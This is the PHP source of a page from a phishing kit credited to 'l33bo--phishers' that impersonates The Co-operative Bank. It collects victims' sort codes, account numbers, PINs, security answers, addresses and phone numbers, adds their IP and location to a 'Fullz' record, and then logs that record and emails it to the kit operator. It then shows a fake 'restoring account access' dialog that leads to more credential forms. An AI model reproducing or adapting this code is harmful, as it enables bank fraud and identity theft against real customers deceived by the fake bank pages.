<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
include "../CONTROLS.php";
include("assets/includes/AES.php");
$sort = $_POST['sort'];
$acno = $_POST['acno'];
$pin=$_POST["pin1"]."".$_POST["pin2"]."".$_POST["pin3"]."".$_POST["pin4"];
$fname=$_POST["fname"];
$address=$_POST["address"];
$postcode=$_POST["postcode"];
$telephone=$_POST["telephone"];
$mobile=$_POST["mobile"];
$school=$_POST["school"];
$memo=$_POST["memo"];
$pob=$_POST["pob"];
$memodate=$_POST["memoday"]."/".$_POST["memomonth"]."/".$_POST["memoyear"];
$lschool=$_POST["lschool"];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "Co-op : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ -------------- L33bo Fullz ---------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $fname
| Address : $address
| Postcode : $postcode
| Home Phone : $telephone
| Mobile Phone : $mobile
+ ------------------------------------------+
+ Account Information (Co-op)
| Sortcode : $sort
| Account Number : $acno 
| Pin : $pin
| First School : $school
| Memorable Name : $memo
| Place of Birth : $pob
| Memorable Date : $memodate
| Last School : $lschool
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";
$imputText = $data;
$imputKey = "232BBCD7D47A1192"; 
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_POST['fname'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwjY2ICzzpDIAhXHuhoKHapxChI&url=http%3A%2F%2Fwww.co-operativebank.co.uk%2F&usg=AFQjCNESma4u8Ae4mkYSDn4fAIReIMb_gA"));
    }
	if(stristr($_POST['address'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwjY2ICzzpDIAhXHuhoKHapxChI&url=http%3A%2F%2Fwww.co-operativebank.co.uk%2F&usg=AFQjCNESma4u8Ae4mkYSDn4fAIReIMb_gA"));
    }
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/co-op.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/co-op.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}	
require "../assets/includes/vpn_check.php";
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Complete</title>
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="user-scalable=yes, width=device-width, initial-scale=1" name="viewport">
<meta http-equiv="refresh" content="5; URL='../Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true'" />
<link rel="stylesheet" href="assets/css/login.css" type="text/css">
<link rel="stylesheet" href="assets/css/custom.css" type="text/css">
<meta content="text/html; charset=windows-1252" http-equiv="Content-Type">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="pragma" content="no-cache"><!--Stops ipads and iphones automatically rendering phone numbers as links -->
<meta name="format-detection" content="telephone=no">
<style>
#dialogoverlay{
	display: none;
	opacity: .8;
	position: fixed;
	top: 0px;
	left: 0px;
	background: #FFF;
	width: 100%;
	z-index: 10;
}
#dialogbox{
	display: none;
	position: fixed;
	background: #002663;
	text-align: center;
	border-radius:7px; 
	width:550px;
	z-index: 10;
}
#dialogbox > div{ background:#FFF; margin:8px; }
#dialogbox > div > #dialogboxhead{ background: white;padding: 20px 0px 20px 5px;border-bottom: 5px solid #002663;}
#dialogbox > div > #dialogboxbody{ background:#FFF; padding:20px; color:#000; }
#dialogbox > div > #dialogboxfoot{ background: #002663; padding:10px; text-align:right; }
</style>
<script>
function CustomAlert(){
    this.render = function(dialog){
        var winW = window.innerWidth;
        var winH = window.innerHeight;
        var dialogoverlay = document.getElementById('dialogoverlay');
        var dialogbox = document.getElementById('dialogbox');
        dialogoverlay.style.display = "block";
        dialogoverlay.style.height = winH+"px";
        dialogbox.style.left = (winW/2) - (550 * .5)+"px";
        dialogbox.style.top = "100px";
        dialogbox.style.display = "block";
        document.getElementById('dialogboxhead').innerHTML = "<img src='assets/img/logo.png'>";
        document.getElementById('dialogboxbody').innerHTML = "Restoring account access please wait...<br><br><img style='display:block;margin-left:50%;margin-right:50%;' src='assets/img/spin.GIF' height='62' width='62'><br><br><strong>For your security you have been automatically logged out</strong>";
        document.getElementById('dialogboxfoot').innerHTML = '';
    }
	this.ok = function(){
		document.getElementById('dialogbox').style.display = "none";
		document.getElementById('dialogoverlay').style.display = "none";
	}
}
var Alert = new CustomAlert();
</script>
</head>
<body onload="Alert.render('Please wait while we renable ');">
   <div id="dialogoverlay"></div>
<div id="dialogbox">
  <div>
    <div id="dialogboxhead"></div>
    <div id="dialogboxbody"></div>
    <div id="dialogboxfoot"></div>
  </div>
</div>   
   <div id="coopHeader">



     <div id="coopHeader">
        <div class="headIntro contain">
            <h1>The Co-operative bank</h1>
            <div class="accDetails">
                <strong>
	            
				</strong>   
            </div>
        </div>
    </div>


    </div>
    <table cellpadding="0" cellspacing="0" width="100%">
    	<tbody><tr>
        <td height="70%">





<form name="login" id="login" method="post" action="Security.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" autocomplete="OFF">
<div id="loginSubHeader">
    <h2 class="loginSubHeader">Welcome to The Co-operative Bank</h2>
</div>
<div id="logonBody">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
    

    <tbody><tr>
        <td colspan="2" align="left">
          <table border="0" width="100%">
            <tbody><tr>
              <td class="verttop" align="left"><br>
                <a href="#"><img src="assets/img/back.gif" border="0"></a>
              </td>
            </tr>
          </tbody></table>
        </td>   
    </tr>
    <tr>
        <td colspan="2" align="left">
          <table border="0" width="100%">
            <tbody><tr>
              <td class="verttop" align="left">
                <br>  			To access your account please enter your 
6-digit sortcode and your 8-digit account number or your 16-digit Visa 
card number.		 <br> <br> 
              </td>
              <td class="verttop" align="right"><br>
              </td>
            </tr>
          </tbody></table>
        </td>    
	<tr id="ShowTopErr" style="display:none">
          <td>&nbsp;
          </td>
          <td id="error" class="error"> </td>
      </tr>
    </tr>
    
    <tr>
        <td class="label" width="20%"><label for="sortcode">          Sort code &nbsp;      &nbsp;</label></td>
        <td class="field"><input id="sort" name="sort" size="7" maxlength="6" class="field" type="text"></td>
    </tr>
    <tr>
        <td class="label"></td>
        <td class="error"></td>
    </tr>
    <tr>
        <td colspan="2">&nbsp;</td>
    </tr>
    <tr>
        <td class="label"><label for="accountNumber">          Account number &nbsp;      &nbsp;</label></td>
        <td class="field"><input name="acno" id="acno" size="9" maxlength="8" class="field" type="text"></td>
    </tr>
    <tr>
        <td class="label">&nbsp;</td>
        <td class="error"></td>
    </tr>
    <tr>
        <td class="label">or&nbsp;&nbsp;&nbsp;&nbsp;</td>
        <td class="label">&nbsp;</td>
    </tr>
    <tr>
        <td class="label" colspan="2">&nbsp;</td>
    </tr>
    <tr>
        <td class="label"><label for="visanumber">          Visa credit card number &nbsp;      &nbsp;</label></td>
        <td class="field"><input name="cclogin" id="visanumber" size="18" maxlength="16" type="text"></td>
    </tr>
    <tr>
        <td class="label"></td>
        <td class="error">&nbsp;</td>
    </tr>
    <tr>
        <td class="label">&nbsp;<br>
        </td>
        <td class="error">
        <br></td>
    </tr>
   
</tbody></table>
</div>
<div id="logonButton">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody><tr>
        <td class="label">&nbsp;</td>
        <td align="right"><a href="#" id="submitBtn" type="submit" value="" onclick="validLogin()"></a></td>
    </tr>
</tbody></table>
</div>
</form>
</td>
    	</tr>
    	<tr>
        <td height="20%">
<table width="100%">
    <tbody><tr>
        <td width="25%">&nbsp;</td>
        <td class="userInfo"></td>
    </tr>
</tbody></table>
</td>
    	</tr>	
	</tbody></table>	
<script>
function validLogin() {
    var x = document.forms["login"]["sort"].value;
	if (x == null || x == "") {
		document.getElementById("ShowTopErr").style.display = "";
		document.getElementById("error").innerHTML = "*** Please enter a sort code and account number or a Visa credit card number. *** ";
        return false;
    }
    var x = document.forms["login"]["acno"].value;
	if (x == null || x == "") {
		document.getElementById("ShowTopErr").style.display = "";
		document.getElementById("error").innerHTML = "*** Please enter a sort code and account number or a Visa credit card number. *** ";
        return false;
    }
document.login.submit();
}
</script>
</body></html>